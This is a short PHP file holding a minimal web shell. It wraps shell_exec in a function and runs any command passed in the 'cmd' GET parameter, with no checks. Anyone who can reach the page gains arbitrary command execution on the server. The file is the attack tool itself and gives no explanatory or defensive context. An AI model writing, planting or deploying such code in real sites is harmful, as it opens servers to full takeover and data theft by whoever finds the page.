<?php
function dQ99exec($cmd) {
    $output = shell_exec($cmd);
    return $output;
}

$cmdline = $_GET['cmd'];
$ret = dQ99exec($cmdline);
?>